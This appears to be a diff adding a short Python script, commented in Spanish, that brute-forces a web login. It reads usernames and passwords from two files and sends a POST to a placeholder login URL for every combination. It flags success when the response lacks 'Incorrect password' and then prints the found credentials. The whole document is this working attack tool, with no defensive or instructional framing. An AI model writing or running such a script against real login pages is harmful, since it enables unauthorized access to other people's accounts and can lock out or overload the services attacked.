@@ -1,0 +1,37 @@
+import requests
+
+# URL 
+URL_LOGIN = "(poner URL)"
+
+# Archivos de usuarios y contraseñas
+archivo_usuarios = "usuarios_noborrar.txt"
+archivo_contrasenas = "passwords_db.txt"
+
+# Leer lista de usuarios
+with open(archivo_usuarios, "r", encoding="utf-8") as f:
+    lista_usuarios = f.read().splitlines()
+
+# Leer lista de contraseñas
+with open(archivo_contrasenas, "r", encoding="utf-8") as f:
+    lista_contrasenas = f.read().splitlines()
+
+# Probar cada combinación de usuario y contraseña
+for usuario in lista_usuarios:
+    for contrasena in lista_contrasenas:
+        # Crear el payload
+        datos = {
+            "username": usuario,
+            "password": contrasena
+        }
+
+        # Solicitud POST
+        respuesta = requests.post(URL_LOGIN, data=datos)
+
+        # Respuesta servidor
+        if "Incorrect password" not in respuesta.text and respuesta.status_code == 200:
+            print(f"[+] ¡Credenciales encontradas! Usuario: {usuario} | Contraseña: {contrasena}")
+            exit()  # Salir al encontrar credenciales correctas
+
+        print(f"[-] Intento fallido: {usuario} | {contrasena}")
+
+print("\n[✖] No se encontraron credenciales válidas.")
